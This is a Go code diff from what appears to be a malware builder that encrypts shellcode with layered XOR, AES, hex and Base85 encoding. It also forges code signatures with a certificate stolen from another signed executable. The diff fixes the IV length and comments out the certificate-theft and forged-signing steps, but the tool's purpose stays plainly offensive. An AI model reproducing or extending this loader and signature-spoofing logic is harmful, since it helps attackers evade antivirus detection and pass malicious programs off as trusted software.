@@ -32,7 +32,7 @@ func main() {
 		FileName:  rand.RStrings(),
 		Path:      "output",
 		Key:       rand.LByteStrings(32),
-		IV:        rand.LByteStrings(32),
+		IV:        rand.LByteStrings(16),
 	}
 	// 读取shellcode，返回加密之后的 strings
 	payload, err := params.SetKeyIV(crypto.XorAesHexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
@@ -122,13 +122,13 @@ func main() {
 	//}
 
 	// 伪造证书配置
-	ct := build.CertThief{
-		SignDir:  "output",
-		SrcFile:  cOpts.ExeFileName,
-		DstFile:  "Code.exe",
-		SignedPE: build.RenameSignedPEName(cOpts.ExeFileName),
-		CertFile: "Code.der",
-	}
+	//ct := build.CertThief{
+	//	SignDir:  "output",
+	//	SrcFile:  cOpts.ExeFileName,
+	//	DstFile:  "Code.exe",
+	//	SignedPE: build.RenameSignedPEName(cOpts.ExeFileName),
+	//	CertFile: "Code.der",
+	//}
 
 	// 保存证书
 	//err = ct.SaveCertificate()
@@ -143,10 +143,10 @@ func main() {
 	//}
 
 	// 利用证书进行签名伪造
-	err = ct.SignWithStolenCert()
-	if err != nil {
-		log.Fatal(err)
-	}
+	//err = ct.SignWithStolenCert()
+	//if err != nil {
+	//	log.Fatal(err)
+	//}
 
 	// 压缩参数
 	//upx := build.UpxOpts{
